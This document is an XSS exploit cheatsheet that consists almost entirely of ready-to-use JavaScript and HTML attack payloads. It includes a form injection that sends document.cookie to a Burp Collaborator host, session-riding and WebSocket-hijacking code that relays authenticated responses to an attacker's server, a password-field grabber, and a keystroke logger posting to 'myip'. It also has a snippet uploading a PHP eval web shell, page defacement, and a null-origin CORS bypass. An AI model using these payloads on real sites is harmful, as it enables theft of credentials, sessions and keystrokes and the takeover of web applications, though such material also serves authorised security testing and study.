# XSS Exploit Cheatsheet

=====

## Send something back or CSRF

GET

```javascript
var uri = "http://<myip>/";
var query = "?message=" + encodeURIComponent("<some-data>");
xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
	if (xhr.readyState == XMLHttpRequest.DONE) {
		// do something after sent
	}
}
xhr.open("GET", uri + query, true);
xhr.send();
```

POST (application/json)

```javascript
var req = new XMLHttpRequest();
req.open("POST", "http://<target>", true); 
req.setRequestHeader("Content-type", "application/json");
req.send(JSON.stringify({
    data: "data"
}));
```

POST (multipart-formdata)

```javascript
var code = "<? eval($_REQUEST[0]);";
var ctype = "text/plain";
var fname = "g.php";
var form = new FormData();
form.append("newAttachment", new Blob([code],  { type: ctype }), fname);

var uri = "http://<target>/";
xhr = new XMLHttpRequest();
xhr.open("POST", uri, true);
xhr.send(form);
```

Submit form

```html
<form id="f" action="http://<target>" method="POST" enctype="multipart/form-data">
<input type="password" name="password">
<input type="password" name="password2">
<input name="website" value="asdf onfocus=location=`http://ttqkxnrpzv248m4hy0oagrvxcoie63.burpcollaborator.net`+document.cookie autofocus">
<input type="file" name="avatar">
</form>
<script>
i=document.createElement('input');
i.name="submit";
f.append(i);
f.submit();
</script>
```

## Session Riding

**XHR** api
```javascript
## send cookie with XHR
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open("GET", "http://<target>/somepage", true);
req.withCredentials = true;
req.send();

function reqListener() {
   // do something after sent
   // for example. pass response to attacker's server
   location='/log?key='+this.responseText;
};
```

**Fetch** api
```javascript
var href = "http://<target>/somepage";
fetch(href, {
    "credentials": 'include',
    "method": "get",
})
.then((response) => {
    return response.text();
})
.then( text => {
	// post something back
	fetch("http://<myip>/record", {
		method: "POST",
		headers: {
            "content-Type": "application/json"
        },
        body: JSON.stringify({
            url: href,
            content: text
        })
	})
})
```

## Defacement

```javascript
html_element = document.getElementsByTagName('html')[0];
html_element.innerHTML = '<!DOCTYPE html><html lang="en"> ... </html>';
```

## Fetch auth pages

Based on `<iframe>`, we can delay N seconds and grab all `<a>` to fetch pages. See [fetchAuth.js](utils/fetchAuth.js).

## Capture pre-filled password

```javascript
var source = 'https://myip'
Array.from(document.forms).forEach( form => {
    Array.from(form.elements).forEach(elem => {
        if(elem.type === "password") {
            fetch(source + "/prefill", {
                method: "POST",
                headers: {
                    "content-Type": "application/json"
                },
                body: JSON.stringify({
                    name: elem.name,
                    value: elem.value
                })
            });
        }
    });
});
```

## KeyLogger

```javascript
var source = 'https://myip';
var recordObj = {};
document.onkeypress = function (e) {
    var current = document.activeElement;
    recordObj[current.name] = recordObj[current.name] || "";
    recordObj[current.name] += e.key;

    
    var req = new XMLHttpRequest();
    req.open("POST",source + "/keylog", true); 				// ADD URL HERE!
    req.setRequestHeader("Content-type", "application/json");
    req.send(JSON.stringify({
        data: recordObj[current.name],
        tagname: current.name,
        tagval: current.value
    }));
    
}
```

## API Server on Attacker side

use `Flask-Cors` to serve resource. See [apiServ.py](utils/apiServ.py)

## Cross-Site WebSocket Hijacking

Requirement: Websocket HTTP request has no CSRF protection.

`wss://  with  https://` and `ws://  with  http://`

```javascript
websocket = new WebSocket('wss://<target>')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
    // initialize the socket
    websocket.send("xxx");
}
function handleReply(event) {
    // hijack socket message here
    // no-cors mimic the <img>'s request
    fetch('https://<myip/?'+event.data, {mode: 'no-cors'})
}
```

## bypass `Access-Control-Allow-Origin: null`

Requirement: X-FRAME-OPTIONS not set 

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,
<script>
    // do something
</script>
"></iframe>
```


## Reference

1. [PortSwigger CORS](https://portswigger.net/web-security/cors)
